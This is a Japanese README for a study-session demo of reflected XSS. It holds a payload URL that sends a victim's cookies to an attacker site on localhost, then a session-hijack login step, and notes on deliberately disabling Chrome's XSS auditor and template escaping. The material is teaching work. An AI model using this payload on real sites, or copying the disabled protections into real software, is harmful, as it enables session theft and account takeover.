# XSSの初歩的な例と実害

を説明するデモです．

## 状況

XSS (_クロス_ サイト スクリプティング) の性質上，localhostの他にも別サイトが必要でした．

<dl>
  <dt>http://脆弱サイト.com:8000</dt>
  <dd>脆弱性を持ったサイト(以下，脆弱サイト)．ログイン機能がある．</dd>

  <dt>http://localhost:5000</dt>
  <dd>攻撃者の用意したサイト(以下，攻撃者サイト) ．</dd>

  <dt>被害者</dt>
  <dd>脆弱サイトのユーザ．攻撃者に脆弱サイトへログインされてしまう．</dd>
</dl>

## 脆弱サイトをいじってみる

```bash
$ google-chrome http://脆弱サイト.com:8000
```

1. `/` において， `user: sampleuser`, `pass: samplepass` と入力してログイン
1. `/login` にて，「ようこそ，sampleuserさん!!」と表示されることを確認

_攻撃目的: `sampleuser/samplepass` を知らないのに，`sampleuser`としてログインする_

## 攻撃手順

※セッションIDをクッキーに保存する部分が未実装です・・・

### 攻撃者サイトを準備

```bash
$ cd 20131117-tokumaru-benkyokai/sample-sites/attacker-sites/ex00_WhatIsXSS
$ carton install  # 大体5分以上かかります・・・・
$ carton exec perl -Ilib script/ex00_whatisxss-server
$ google-chrome http://localhost:5000
```

### 怪しいリンクを踏ませて脆弱サイトのCookieを入手

1. 下記リンクは，攻撃者がTwitterなどにポストする(短縮URLなど使うとなおのこと引っ掛けやすい)
1. 被害者が下記リンクを踏む
1. 脆弱サイトにてXSS攻撃が成立する
1. 攻撃者サイトにリダイレクトされ，攻撃者サイトに脆弱サイトのCookieが表示される(表示されるということは，その文字列を攻撃者サーバに保存することも容易)

```bash
$ google-chrome --disable-xss-auditor "http://脆弱サイト.com:8000/status?uid=%3Cscript%3Ewindow.location=%22http://localhost:5000/?cookie=%22%2bdocument.cookie%3C/script%3E"
```

_注意: まともなブラウザなら，単純なXSS攻撃は検知してscript実行を中止する．`--disable-xss-auditor`によってchromeにわざとXSS攻撃に引っかかってもらう．_

### Cookie中のセッションIDを使って脆弱サイトにログイン

1. 攻撃者は先程手にしたセッションIDをコピー
1. 下記のように脆弱サイトにアクセスし，ログインが成立

```bash
$ google-chrome http://脆弱サイト.com:8000/login?sid=[セッションID]
```


## 付録

### 攻撃者サイトの準備

```bash
$ cd 20131117-tokumaru-benkyokai/sample-sites/vulnerable-sites/ex00_WhatIsXSS
$ sqlite3 db/development.db < sql/sqlite.sql
$ carton install
$ carton exec perl -Ilib script/ex00_whatisxss-server --host=[IPアドレス] --port=[ポート番号]
```

### Amon2とGoogle Chromeを脆弱にするためにわざわざやったこと

最近のブラウザやらWebアプリフレームワークやらは脆弱性対策されてるんですね．
おい! 誰だPHPの話したの!! 関係ないだろ!!!!

<dl>
  <dt>ChromeのXSS検知&防止機構を無効にする</dt>
  <dd>起動オプションに --disable-xss-auditor をつけて，サーバからのレスポンスヘッダには<a href="/sample-sites/vulnerble-sites/ex00_WhatIsXSS/lib/Web.pm#L47">X-XSS-Protectionを0に指定</a></dd>

  <dt>XslateのHTMLエスケープを無効化</dt>
  <dd><a href="/sample-sites/vulnerable-sites/ex00_WhatIsXSS/tmpl/status.tx#L10">mark_raw 指定をする</a></dd>
</dl>
